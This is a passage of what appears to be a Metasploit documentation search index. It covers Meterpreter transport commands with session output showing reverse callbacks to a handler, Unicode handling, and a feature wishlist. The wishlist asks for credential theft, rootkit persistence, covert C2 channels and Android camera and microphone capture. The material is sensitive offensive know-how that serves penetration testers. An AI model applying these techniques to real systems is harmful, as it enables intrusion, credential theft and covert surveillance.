your target as a result of your post-exploitation shenanigans. The command is similar to add in that it takes a subset of the parameters, and then adds a new one on top of it: -t - The transport type. -l - The LHOST value (unless it's bind_tcp ). -p - The LPORT value. -u - This value is only required for reverse_http/s transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions. [*] Starting interaction with 2... meterpreter > transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/ 300 3600 10 meterpreter > transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ [*] Removing transport ... [+] Successfully removed reverse_http transport. meterpreter > transport list Session Expiry : @ 2015-07-10 07:39:08 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:5000 300 3600 10 meterpreter >","title":"Removing transports"},{"location":"dev/dark/Meterpreter-Transport-Control/#resilient-transports","text":"Prior to the recent changes, Meterpreter only had built-in resiliency in the HTTP/S payloads and this was due the nature of HTTP/S as a stateless protocol. Meterpreter now has resiliency features baked into TCP transports as well, both reverse and bind . If communication fails on a given transport, Meterpreter will roll over to the next one automatically. The following shows Metasploit being closed and leaving the existing TCP session running behind the scenes: meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 meterpreter > background [*] Backgrounding session 5... msf exploit(handler) > exit -y With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this TCP transport, and has automatically moved over to the HTTP transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings. The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically: ./msfconsole -r ~/msf.rc [*] Starting the Metasploit Framework console...| IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6. .P : .' / | \\ `. : II 'T;. .;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]] + -- --=[ 1460 exploits - 835 auxiliary - 229 post ] + -- --=[ 426 payloads - 37 encoders - 8 nops ] + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ] ... snip ... [*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ... [*] Meterpreter session 1 opened (10.1.10.40:5105 -> 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000 msf exploit(handler) > sessions -l Active sessions =============== Id Type Information Connection -- ---- ----------- ---------- 1 meterpreter x86/win32 WIN-S45GUQ5KGVK\\OJ @ WIN-S45GUQ5KGVK 10.1.10.40:5105 -> 10.1.10.40:46457 (10.1.10.35) msf exploit(handler) > sessions -i 1 [*] Starting interaction with 1... meterpreter > transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 tcp://10.1.10.40:6000 300 3600 10 The session is back up and running as if nothing had gone wrong. In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter's transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there's a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both TCP and HTTP/S . For important detail on network resiliency, please see the reliable network communication documentation .","title":"Resilient transports"},{"location":"dev/dark/Meterpreter-Transport-Control/#supported-meterpreters","text":"The following Meterpreter implementations currently support the transport commands: Windows x86 Windows x64 POSIX x86 Android Java Python","title":"Supported Meterpreters"},{"location":"dev/dark/Meterpreter-Unicode-Support/","text":"Until recently (April 2015), Meterpreter always sent string data in whatever the system encoding happened to be. With the TLV protocol, the TLV_TYPE_STRING was treated roughly as a plain C byte array, with no real expectations as to how the data should be decoded on the Meterpreter or Metasploit framework sides. As a result, type confusion occurred between different locales on remote machines and the local console. To avoid corrupting the terminal due to mistaken character encoding interpretations, Metasploit framework implements Unicode filter that converts any possibly unprintable characters into hex strings. While this allows a sufficiently-advanced human to eyeball a string for meaning, it makes dealing with Unicode strings awkward. To solve the problem, TLV_TYPE_STRING has been retroactively declared to mean UTF-8 encoding only. All Meterpreter implementations should send UTF-8 strings and expect them in requests. On Windows systems, this means that Meterpreter needs to convert to and from Windows' UTF-16LE implementation. So far, the Filesystem operations on all Meterpreters have been converted to expect a and send UTF-8 strings. Only the PHP meterpreter on Windows lacks Unicode support, due to limitations in PHP itself. All new TLVs should send and receive UTF-8. There is still functionality, that needs conversion beyond the Filesystem APIs, and these can be loosely discovered with a command like grep -R A\\( * to find all ASCII variants of functions called by meterpreter. In the Windows C meterpreter, there are a couple of helper functions to simplify the conversion work: wchar_t *utf8_to_wchar(const char *in); char *wchar_to_utf8(const wchar_t *in); These functions both allocate a new string as their return value, so the strings should be freed after use by the caller. Here is an example of a function expanding a path and performing the conversion to and from UTF-8: char * fs_expand_path(const char *regular) { wchar_t expanded_path[FS_MAX_PATH]; wchar_t *regular_w; regular_w = utf8_to_wchar(regular); if (regular_w == NULL) { return NULL; } if (ExpandEnvironmentStringsW(regular_w, expanded_path, FS_MAX_PATH) == 0) { free(regular_w); return NULL; } free(regular_w); return wchar_to_utf8(expanded_path); } Unicode support in Metasploit framework today is enabled by default on Linux/Unix systems, since most modern terminal emulators have no trouble displaying the characters. However, on Windows, most native terminal emulators ironically have trouble working with more than one language at once, due to historical code page support. So, for Windows, Unicode characters are still filtered by default. Setting EnableUnicodeEncoding to false will allow the native characters to be emitted by the Metasploit console.","title":"Meterpreter Unicode Support"},{"location":"dev/dark/Meterpreter-Wishlist/","text":"This document is our live wishlist of features and changes for the Metasploit Meterpreter payloads. The majority of this list came from a survey sent out to the community in early 2015. If you plan to work on one of these features, please add a note to the item, and reference any open tickets or pull requests that are relevant. This document only contains survey suggestions that were specific to Meterpreter. Duplicate and similar items have been combined. Items currently in development have been marked [ IN PROGRESS ] Items landed to master have been marked [ DONE ] Related open tickets (slightly broader than Meterpreter): * Make User-Agent easier to control across modules and more consistent * Comprehensively refactor Windows reverse_http stagers * Python reverse HTTPS stager * Port windows reverse_tcp & bind_tcp to Metasm Meterpreter Platform Support Mac Meterpreter iOS Meterpreter PHP Meterpreter should have equivalent functionality to Win32 Python Meterpreter should have equivalent functionality to Win32 POSIX Meterpreter should have equivalent functionality to Win32 (extract it from Win32 codebase) Powershell Meterpreter Some users indicated that the Python/PHP Meterpreters were important because the POSIX/Linux Meterpreter was not working for them Mimikatz Integration In-memory pass-the-hash (basically this runs a process as \u201cnetonly\u201d I believe, then injects real credential hashes supplied by the user in order to perform network based auth to things with only a hash) Exporting of certificates, keys, and tickets in base64 format (already supported) then down to real files on disk for the attacker info Add on-target minidump extraction Add sekurla::searchpasswords Expand mimikatz and contribute back to it Integration of Mimikatz with the credential database Latest version of Mimikatz to be used as the plugin It would be great to have a method to generate a golden ticket for a specific period of time (month, 6-months, year) rather than only 10 years. Meterpreter Pivoting VPN Pivoting for Framework (WinPcap still better than nothing) Reverse pivoting from the target machine back to the attacker (TCP/UDP) . For many years I\u2019ve asked for this feature. Basically Meterpreter needs to be able to say, listen on port 8080 on victim 1 and it go through the Meterpreter session to port whatever (9060) on the attacker\u2019s machine or a designated alternate IP. then, whenever someone hits that port it\u2019s auto forwarded through the session. This could help out a lot for SMB capture, Post exploitation phishing, and other things like setting a user\u2019s proxy to use your forwarded port instead of the corporate proxy. Improved pivoting speed and latency Pivoting that is reliable and works well with different transports. In particular, I want the ability to pivot one session through another even if the first session is reverse_tcp or reverse_https, regardless of the second sessions transport. This will be difficult without installing drivers, but I would like several useful, working transports that I know I can pivot reliably with. Carry portforwards and other channels along with a migrate. Privilege Escalation Allow privilege escalation modules to increase the privileges of the current session instead of firing off a new session. Automated privesc for all platforms - not just Windows. Implement a \"privup\" command that is similar to getsystem which automatically tries to get higher privs using local exploits. Allow the user to specify a \"force\" flag to automatically try \"dangerous\" privilege escalations (kernel mode, etc) Make the \"local\" modules more seamlessly accessible inside Meterpreter without requiring sending your session to background and running a local module separately against it.Would be nice to have a built-in Meterpreter command called \"local\" with tab complete that would list the local modules relevant to that platform/arch - then running one of the local modules auto selects your current session, spawns a new metepreter session and transfers you over to that session automatically if successful with a clear message/indication that your now in a new elevated Meterpreter session. Remote File Access [ DONE ] Console/Meterpreter: Support for uploading, downloading, deleting, renaming, and listing files using UTF-8 input and showing UTF-8 output, converting this in the Meterpreter payload as necessary to support accessing unicode paths on the target. [ DONE ] Console: The ls command should support wildcards in the directory listing, ex: ls *.csv [ DONE ] Console: The ls command should support sorting files by date, name, or size [ DONE ] Console: The ls command should support listing MSDOS 8.3 (short) names if available on Windows [ DONE ] Console: The download command should support filtering files based on a wildcard match (recursively, too) [ DONE ] Console: The download command should mirroring an entire remote file system to a local directory (names, paths, and timestamps) Meterpreter Features Direct Powershell integration on Windows (load & run .NET runtimes from inside Meterpreter) Remote (target-side) scripting Builtin userland persistence Builtin rootkit/bootkit payload persistence Create payloads that only \"install\" on specific computers (based on hardware, windows domain, etc) Acquire a physical RAM image without touching the disk. This currently requires uploading winpmem[64].sys to windows\\system32 and invoking it through post/windows/manage/driver_loader. As loaded winpmem.sys exposes the RAM as disk device I can then suck it through post/windows/manage/nbd_server. Please make this possible without dropping winpmem.sys to system32 folder if possible Manage multiple Meterpreter processes as one session as described in #4715. Many times there have been situations where a keyscan, or sniffer was going and something else occurred that required migration or cancelling to perform an action. \u201cInstalling\u201d jobs in processes less likely to die would allow a pentester to still move around as needed but also be able to have persistent tasks going. A pipe dream of this feature would be to install a \u201crev2system\u201d jobs whereby I could migrate to a low priv status for accessing Cryptolib encrypted storage but also get back to SYSTEM when I\u2019m done without needing to pop a shell again. Another pipe dream here would be to also have jobs that if the user logged out, then back in the next day and I had a shell come back then, I could re-attach to my running jobs and get their results PrependTokenSteal / PrependEnvironmentSteal: Basically with proxies and other perimeter defenses being SYSTEM doesn\u2019t work well. This would be an addition to a payload that would work to execute as SYSTEM but would then locate a logged in user and steal their environment to call back to the handler. Very useful when pivoting around with PSEXEC Binary installed death dates: A way putting a date in a binary where after that date the binary no longer functions would be useful and possibly even perform self-deletion. Time zones would be a tricky matter, but is something handled by many programmers already (probably just not in shellcode) Allow Meterpreter sesssions to resolve L3 addresses (#4793) Track whether or not the current session has admin credentials (#4633)d Support Metasploit-side zlib compression of sessions Being able to use Meterpreter instances to easily forward commands & exfil Automatic cleanup and removal of session and any recorded persistence after predetermined amount of time (server-side) Change desktop/phone background Remote mouse control Play sound on the remote system Read words outloud via text to speech on the remote system Volume control RSS feed from reverse_http(s) mult-handler that I can connect a RSS reader to (or something like IFTTT) and get notices when new sessions are created MessageBox popups Call the system \"open\" command easily (ShellExecute on windows, launch intent on Android) Gather credentials from Google Chrome LNK (binary) modification: Editing a LNK file\u2019s ICON location (for SMB capturing), \u201cStarting Directory\u201d (for DLL injection) or target binary would make some post exploitation tasks easier \u201cPinned\u201d app modification: Knowing which apps are pinned, and what they link to (be it taskbar or start menu) would be useful intelligence, but also being able to modify the target of these links would be better and a very easy user-land persistence. (Run this && the real thing you want) Remote Registry automation: Remotely editing or reading the registry of a remote system works currently (sometimes) but it has no smarts about if the Remote Registry service is on or not. It would be nice to automate the starting and stopping of the remote registry service as well as possibly warning the user if they are attempting to do this as SYSTEM (probably going to fail). The use case for this is installing persistence on lots of systems quickly as well as reading user lists, MRUs and other intelligence important keys. (like finding a system with the puTTY keys) \u201cps\u201d and \u201ckill\u201d for remote systems: This would remove the need to drop to a shell and attempt to remember how to format \u201ctaskkill\u201d and \u201ctasklist\u201d\u2019s argument list. Tasklist also automatically removes the IPC$ connection after it\u2019s done so results in some annoying disconnected share viewing Scheduled Tasks / AT: Many of the ways to pivot or stay persistent use AT or Scheduled Tasks, to do so. This functionality to do tasks both locally and on remote hosts would greatly decrease the number of times a pentester would need to drop to cmd.exe [ DONE ] Execute with login credentials: When a user is no longer online it is overkill to PSEXEC (which would just net a SYSTEM shell anyways with MSF) and \u201cRunAs\u201d isn\u2019t supported since it requires a password at a prompt, so adding a simple CreateProcesWithLogon feature would help with reviving dead tokens #4649 ListDrives: Most of the time shares and other drives rather than just C: are where important files are stored. This feature would list local storage (plus USB) and network storage (SMB connected drives with where they are connected from and as what user) to start, but this feature would need to grow to support \u201cCloud\u201d drives as well, like Dropbox, Box, Google Drive, and SkyDrive. Enumerables support in Railgun: Windows is full of \u201cEnumerables\u201d like EnumWindows that would be nice to have the ability to create code for. That example is bad since ExtAPI has EnumWindows now but the argument doesn\u2019t go away for railgun DACL / Permissions enumeration: This is just needed in general for privilege escalation enumeration, share permissions, and reporting (\u201cWhy did you have access to this share, it was only supposed to be for X\u201d) Gina/SSP support: This would probably need to be an injected \u201cjob\u201d but the basic premise is an in-memory load of a SSP or inject into Gina so when a new login happens against the system a set of clear text credentials are captured. 2 extremely use cases would be on a terminal server, or a server that no one is logged into at the time of infection due to time zone or operating hour differences Websnapshot: Currently there isn\u2019t a way to weed out web applications once in a network. This feature would, using IE, or another method be able to generate a screenshot of what a page looks like in a browser (given a PROTOCOL/URL/PORT). Biggest requirement is auto-accepting any self signed SSL certs and showing when authentication is required. On-target resource cloning: Allowing a pentester to drop a binary and clone the ICON (in particular) of a binary would add to the stealthiness of an operation and add attack opportunities that weren\u2019t previously thought plausible Scatterbomb: Persistence is difficult, and making sure your session doesn\u2019t die because you chose the wrong process to migrate into or the user exited that process because the PDF looked hung. This would work by attempting OpenProcess on every process or a select list of processes and inject Meterpreter threads into them. But it would rely on the Mutex feature so that only one would be calling back at a time. Basically allowing for a resilient semi-persistent Meterpreter session that would save you from yourself when you accidentally type exit on the Meterpreter> prompt instead of your other terminal Mutex checking binary exports: This follows up with the scatterbomb but essentially when installing persistence as a pentester I only install one because installing more than one would raise the noise level of a compromised host. If the binary/callback would check a mutex before doing anything and looping based on a timeout that even better. OLE / Office Controls: This is basically an open ended feature request asking for support of for Office, mostly Outlook (like read newest emails, search email, etc). Configurable character set conversation for Shell sessions and channels. When spawning a windows shell from meterpreter, on a host that uses a German version of windows, all the special characters (e.g. \u00f6\u00e4\u00fc) are broken, i.e. they are either not rendered at all, or replaced with that default \"character not found\" unicode character. Forcing the terminal emulator to use cp850 made it work for now. Metepreter Stager Support [ DONE ] Network error tolerant versions of existing stagers [ DONE ] Tagged stagers that send the payload type, arch, platform during the staging process to enable shared listeners [ DONE ] Stagers that contain an embedded unique ID that can be used to identify which payload triggered what session [ DONE ] Stagers that are \"stageless\" for Meterpreter (include the entire main Meterpreter payload, plus any required extensions). In situations of high network latency or extreme network detection a non-staged exe is the only way to go. Ulta-met is a project that does this but isn\u2019t as stable or easy to work with as if it were just built into the binary creation options. [ DONE ] Stagers that are \"stageless\" for Meterpreter and include all potential functionality (all extensions) Meterpreter Transport Flexibility [ DONE ] Support for changing the transport (host, port, URL) of a live session to a new endpoint or protocol [ DONE ] Support for multiple transports for the initial session, using the first transport that works [ DONE ] Support for multiple endpoints across multiple transports for the initial session [ DONE ] Support for automatic switching between multiple transports while the session is running [ DONE ] Support for user-configured callback frequency and endpoint rotation Support for Tor tunneling to .onion and internet-facing listeners Support for time-based callback, such as limiting callbacks to certain times of the day. Support for P2P style callbacks. Gossip protocol to find other Meterpreters on the network and use them as exfiltration point. This callback would reduce the amount of endpoints that would call \u201cout\u201d to a handler to 1. Whoever the \u201cmaster\u201d was. All comms would automatically (because, math) find and delegate this master and finally send through the master all of their comms. This could happen over a named pipe, or a forwarded port or something. (DHT?) Support for DNS A/TXT transports Support for UDP transports Support for ICMP transports Support for TLS encrypted bind listeners Support for HTTP application listener (ie CGI mode Meterpreter session, tomcat servlets, etc) Support for third-party communication transports (Github, Twitter, pastebin, etc) Support for XMPP transports. Many organizations use IM and chat clients internally and support them going outbound. reverse_tcp being stopped for the most part these days and more and more catching reverse_http(s) due to proxies, this might become the next outlet. Possibly using server that are already established in the industry ;-) but mainly supporting XYZ jabber server as a pass through. This would probably be a very big piece of shellcode as I don\u2019t believe any Windows OSs support XMPP out of the box. Support for IE callback: One method deployed by some more infamous malware is to only communicate when IE is running and surfing and only by hooking IE to send comms. This callback would operate very much the same and would support any kind of proxy by default as IE does. Support for Outlook callback: This callback would use email back and forth either directly to a MSF run SMTP server or through other services, but the C2 channel would be locally (not on the exchange filter system) auto-filtered to a non-visible folder (using PidTagAttributeHidden). This type of comms would greatly increase the lag time supported in Metepreter simply due to the inherent lag in email. Meterpreter HTTP Transport Options [ DONE ] Create a whitelist of allowed URLs on the handler, have these persistent between metasploit runs [ DONE ] Indicate whether a given handler should silently accept, accept and report, or drop connections using unregistered URLs [ DONE ] Whitelisted URLs should be referencing using an alias, stored persistently with the URL [ DONE ] Session listing output should indicate what URL and URL alias a particular session is associated with [ DONE ] URLs can be anywhere from 30 to 128 bytes long Meterpreter Proxy Support [ DONE ] Use Windows Credentials with NTLM Authentication to connect via System Proxy back to attacker If Meterpreter executes as system - option to find a user, and use that users proxy settings for comms (temporarily or cleanup on exit) - maybe something like RunAsCurrentUser [ DONE ] Better proxy support and the ability to sleep. Still more to done on burstable updates Communication Protection Authenticated callbacks: This is pretty straight forward, when a pentester no longer controls the IP they were attacking from and failed to clean up every binary and phishing email there is a chance of compromise by proxy. The problem was somewhat solved with SessionExpirationTimeout and SessionCommunicationTimeout but both of them are loaded in the stage, not hard coded into any binary built, so it\u2019s very easy to get into this situation. Authenticated callbacks would allow a pentester to add a small layer of protections if this event were to happen and a callback from a client was sent to an IP no longer in the pentester\u2019s control Embedded TLS cert or hash of cert to verify Meterpreter instance on the Metasploit side [ DONE ] Embedded TLS cert or hash of cert to verify Metasploit instance on the Meterpreter side Embedded password to verify Meterpreter instance on the Metasploit side (challenge-response) Embedded password to verify Metasploit instance on the Meterpreter side (challenge-response) [ DONE ] Enable TLS verification to verify Metasploit instance on the Meterpreter side [ DONE ] Allow open, relaxed, strict modes of payload authentication (everything, everything but flag unauthorized, drop non-authorized) Communications Evasion Emulation of common web application traffic when using HTTP-based transports Change web application traffic emulation fingerprints on the fly when using HTTP-based transports [ DONE ] Sleeping for a specified period of time before reconnecting to Metasploit [ DONE ] Automatic shutdown/cleanup after a specified amount of time has passed Traffic shaping or malleable communications, especially for HTTP(S), can be very useful for blending in, or even for adversary simulation. See Maligno (OSS - http://www.encripto.no/tools/ ) Malleable network signatures in general Malleable file artefacts - Make Meterpreter look like PlugX / Poison Ivy / etc. Stealthier network comms (C2 DLL inject into web browser) Better support to automatically identify applications that use a corporate proxy that allows outside connections and then leverage this application's features Emulate various real world malware Being able to use Meterpreter instances to easily forward commands & exfil Supporting a set URI path for reverse_http(s), so you can use other webservers as a reverse proxy. Session Handlers [ DONE ] Generate a unique ID for each session (target-side) [ DONE ] Generate a unique ID for each generated payload Backdooring/Persisting on more than 10 machines over months it gets very difficult to know when a host hasn\u2019t called back in a while or when a new host arrives. This would need not to be based on gateway, local IP, or any other transient information. This can be processed at any step as long as when STDAPI is loaded I can quickly identify if it\u2019s a system that I\u2019ve known about, and how long it\u2019s been since I\u2019ve seen it. Shared listeners that can stage multiple payload architectures and platforms (using tags). Depends on new stagers and a new listener and unique IDs. [ IN PROGRESS ] [ DONE ] Track the last time a given session checked in Track user defined state data in the db, such as specific user / member of group logged in, specific shares open, certain tuple of IP:port in network connections (1.2.3.4 over 22 where 1.2.3.4 is an IP of interest) Reconnecting payloads will have different IPs, take this into account for session methods (peerinfo/tunnelinfo, etc) Session Reliability [ DONE ] Metasploit payloads should always restore connections if there is a network error unless the user explicitly kills the session Improve reliability, encryption, authentication. Better integration for custom payloads. Spawn a new session before running a module that could crash the current session (mostly privilege escalation, but some buggy post modules too [railgun]) Meterpreter should work robustly in a VM, on a cloud server, or through corp proxies Android Meterpreter Features Android gather modules for auth tokens & sqlite databases (call logs, contacts, email, etc) [ DONE ] Android lock screen removal Crack the lock screen hash to reveal the password, pin code or gesture Remote screen control Add record_mic_stream (trigger based on event, like phone call) [ DONE ] Grab photos from front and rear cameras Android desktop background, sound play, vibrate, screenshot [ DONE ] Quickly grab GPS coordinates Windows post module to install Meterpreter on any attached android devices Better pivoting (e.g bridging between WiFi and 4g) More root exploits Dump browsing history and cookies Comprehensive test suite (including rspec) ARM/POSIX Meterpreter [ DONE ] Support for native payloads in the addJavascriptInterface exploit Payload Generation Msfvenom should support injecting into existing APKs for Android Meterpreter deployment. Otherwise, it's just an app the target installs for 10 seconds and removes after confirming it has no user interface, barely allowing the Meterpreter session to be created. [ IN PROGRESS ] Msfvenom really needs to spit out some C# payloads. You can pretty easily modify some of the powershell ones to be C#, but there really ought to be a built in C# payload. [ DONE ] Generated payloads should default to exiting the process when the shellcode completes [ DONE ] Payload generation should allow named UUIDs to be injected into payloads Unit testing for payloads Metasploit payload classes should have specs, new specs should be created when any class is changed if there isn\u2019t an existing spec. Metasploit payload tests that can run in Travis, should be automatically tested end-to-end Metasploit payload tests that can\u2019t run in Travis should be run by Jenkins and target a virtual machine (local or cloud-hosted). Meterpreter payloads should test every advertised console command. Meterpreter payloads should test a subset of the full APIs available. Meterpreter Specifications These define compatibility, quality, and order of preference for Meterpreter payload modules, including stages and stages. Payload Flags (for matching with exploits/generators/handlers): Supports SSL Supports ZLIB Staged / Unstaged Quality Rank (for prioritizing bugs/feature work): Leverage using Rank system Windows: Excellent Python: Great Java: Good PHP: Normal POSIX: Normal Capabilities (queried post-stage to determine features): Filesystem Registry Pivoting (sockets) Pivoting vpn) Process listing, kill, execute Process memory read, write, injection Migration","title":"Meterpreter Wishlist"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-platform-support","text":"Mac Meterpreter iOS Meterpreter PHP Meterpreter should have equivalent functionality to Win32 Python Meterpreter should have equivalent functionality to Win32 POSIX Meterpreter should have equivalent functionality to Win32 (extract it from Win32 codebase) Powershell Meterpreter Some users indicated that the Python/PHP Meterpreters were important because the POSIX/Linux Meterpreter was not working for them","title":"Meterpreter Platform Support"},{"location":"dev/dark/Meterpreter-Wishlist/#mimikatz-integration","text":"In-memory pass-the-hash (basically this runs a process as \u201cnetonly\u201d I believe, then injects real credential hashes supplied by the user in order to perform network based auth to things with only a hash) Exporting of certificates, keys, and tickets in base64 format (already supported) then down to real files on disk for the attacker info Add on-target minidump extraction Add sekurla::searchpasswords Expand mimikatz and contribute back to it Integration of Mimikatz with the credential database Latest version of Mimikatz to be used as the plugin It would be great to have a method to generate a golden ticket for a specific period of time (month, 6-months, year) rather than only 10 years.","title":"Mimikatz Integration"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-pivoting","text":"VPN Pivoting for Framework (WinPcap still better than nothing) Reverse pivoting from the target machine back to the attacker (TCP/UDP) . For many years I\u2019ve asked for this feature. Basically Meterpreter needs to be able to say, listen on port 8080 on victim 1 and it go through the Meterpreter session to port whatever (9060) on the attacker\u2019s machine or a designated alternate IP. then, whenever someone hits that port it\u2019s auto forwarded through the session. This could help out a lot for SMB capture, Post exploitation phishing, and other things like setting a user\u2019s proxy to use your forwarded port instead of the corporate proxy. Improved pivoting speed and latency Pivoting that is reliable and works well with different transports. In particular, I want the ability to pivot one session through another even if the first session is reverse_tcp or reverse_https, regardless of the second sessions transport. This will be difficult without installing drivers, but I would like several useful, working transports that I know I can pivot reliably with. Carry portforwards and other channels along with a migrate.","title":"Meterpreter Pivoting"},{"location":"dev/dark/Meterpreter-Wishlist/#privilege-escalation","text":"Allow privilege escalation modules to increase the privileges of the current session instead of firing off a new session. Automated privesc for all platforms - not just Windows. Implement a \"privup\" command that is similar to getsystem which automatically tries to get higher privs using local exploits. Allow the user to specify a \"force\" flag to automatically try \"dangerous\" privilege escalations (kernel mode, etc) Make the \"local\" modules more seamlessly accessible inside Meterpreter without requiring sending your session to background and running a local module separately against it.Would be nice to have a built-in Meterpreter command called \"local\" with tab complete that would list the local modules relevant to that platform/arch - then running one of the local modules auto selects your current session, spawns a new metepreter session and transfers you over to that session automatically if successful with a clear message/indication that your now in a new elevated Meterpreter session.","title":"Privilege Escalation"},{"location":"dev/dark/Meterpreter-Wishlist/#remote-file-access","text":"[ DONE ] Console/Meterpreter: Support for uploading, downloading, deleting, renaming, and listing files using UTF-8 input and showing UTF-8 output, converting this in the Meterpreter payload as necessary to support accessing unicode paths on the target. [ DONE ] Console: The ls command should support wildcards in the directory listing, ex: ls *.csv [ DONE ] Console: The ls command should support sorting files by date, name, or size [ DONE ] Console: The ls command should support listing MSDOS 8.3 (short) names if available on Windows [ DONE ] Console: The download command should support filtering files based on a wildcard match (recursively, too) [ DONE ] Console: The download command should mirroring an entire remote file system to a local directory (names, paths, and timestamps)","title":"Remote File Access"},{"location":"dev/dark/Meterpreter-Wishlist/#meterpreter-features","text":"Direct Powershell integration on Windows (load & run .NET runtimes from inside Meterpreter) Remote (target-side) scripting Builtin userland persistence Builtin rootkit/bootkit payload persistence Create payloads that only \"install\" on specific computers (based on hardware, windows domain, etc) Acquire a physical RAM image without touching the disk. This currently requires uploading winpmem[64].sys to windows\\system32 and invoking it through post/windows/manage/driver_loader. As loaded winpmem.sys exposes the RAM as disk device I can then suck it through post/windows/manage/nbd_server. Please make this possible without dropping winpmem.sys to system32 folder if possible Manage multiple Meterpreter processes as one session as described in #4715. Many times there have been situations where a keyscan, or sniffer was going and something else occurred that required migration or cancelling to perform an action. \u201cInstalling\u201d jobs in processes less likely to die would allow a pentester to still move around as needed but also be able to have persistent tasks going. A pipe dream of this feature would be to install a \u201crev2system\u201d jobs whereby I could migrate to a low priv status for accessing Cryptolib encrypted storage but also get back to SYSTEM when I\u2019m done without needing to pop a shell again. Another pipe dream here would be to also have jobs that if the user logged out, then back in the next day and I had a shell come back then, I could re-attach to my running jobs and get their results PrependTokenSteal / PrependEnvironmentSteal: Basically with proxies and other perimeter defenses being SYSTEM doesn\u2019t work well. This would be an addition to a payload that would work to execute as SYSTEM but would then locate a logged in user and steal their environment to call back to the handler. Very useful when pivoting around with PSEXEC Binary installed death dates: A way putting a date in a binary where after that date the binary no longer functions would be useful and possibly even perform self-deletion. Time zones would be a tricky matter, but is something handled by many programmers already (probably just not in shellcode) Allow Meterpreter sesssions to resolve L3 addresses (#4793) Track whether or not the current session has admin credentials (#4633)d Support Metasploit-side zlib compression of sessions Being able to use Meterpreter instances to easily forward commands & exfil Automatic cleanup and removal of session and any recorded persistence after predetermined amount of time (server-side) Change desktop/phone background Remote mouse control Play sound on the remote system Read words outloud via text to speech on the remote system Volume control RSS feed from reverse_http(s) mult-handler that I can connect a RSS reader to (or something like IFTTT) and get notices when new sessions are created MessageBox popups Call the system \"open\" command easily (ShellExecute on windows, launch intent on Android) Gather credentials from Google Chrome LNK (binary) modification: Editing a LNK file\u2019s ICON location (for SMB capturing), \u201cStarting Directory\u201d (for DLL injection) or target binary would make some post exploitation tasks easier \u201cPinned\u201d app modification: Knowing which apps are pinned, and what they link to (be it taskbar or start menu) would be useful intelligence, but also being able to modify the target of these links would be better and a very easy user-land persistence. (Run this && the real thing you want) Remote Registry automation: Remotely editing or reading the registry of a remote system works currently (sometimes) but it has no smarts about if the Remote Registry service is on or not. It would be nice to automate the starting and stopping of the remote registry service as well as possibly warning the user if they are attempting to do this as SYSTEM (probably going to fail). The use case for this is installing persistence on lots of systems quickly as well as reading user lists, MRUs and other intelligence important keys. (like finding a system with the puTTY keys) \u201cps\u201d and \u201ckill\u201d for remote systems: This would remove the need to drop to a shell and attempt to remember how to format \u201ctaskkill\u201d and \u201ctasklist\u201d\u2019s argument list. Tasklist also automatically removes the IPC$ connection after it\u2019s done so results in some annoying disconnected share viewing Scheduled Tasks / AT: Many of the ways to pivot or stay persistent use AT or Scheduled Tasks, to do so. This functionality to do tasks both locally and on remote hosts would greatly decrease the number of times a pentester would need to drop to cmd.exe [ DONE ] Execute with login credentials: When a user is no longer online it is overkill to PSEXEC (which would just net a SYSTEM shell anyways with MSF) and \u201cRunAs\u201d isn\u2019t supported since it requires a password at a prompt, so adding a simple CreateProcesWithLogon feature would help with reviving dead tokens #4649 ListDrives: Most of the time shares and other drives rather than just C: are where important files are stored. This feature would list local storage (plus USB) and network storage (SMB connected drives with where they are connected from and as what user) to start, but this feature would need to grow to support \u201cCloud\u201d drives as well, like Dropbox, Box, Google Drive, and SkyDrive. Enumerables support in Railgun: Windows is full of \u201cEnumerables\u201d like EnumWindows that would be nice to have the ability to create code for. That example is bad since ExtAPI has EnumWindows now but the argument doesn\u2019t go away for railgun DACL / Permissions enumeration: This is just needed in general for privilege escalation enumeration, share permissions, and reporting (\u201cWhy did you have access to this share, it was only supposed to be for X\u201d) Gina/SSP support: This would probably need to be an injected \u201cjob\u201d but the basic premise is an in-memory load of a SSP or inject into Gina so when a new login happens against the system a set of 